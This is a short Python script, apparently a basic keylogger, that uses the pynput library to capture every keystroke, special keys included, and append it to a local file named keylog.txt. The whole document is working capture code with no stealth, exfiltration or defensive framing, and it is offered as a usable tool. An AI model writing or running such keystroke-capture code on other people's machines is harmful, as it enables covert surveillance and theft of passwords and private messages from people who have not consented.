from pynput import keyboard

# File to store keystrokes
log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys like space, enter, etc.
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

# Start listening to the keyboard
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
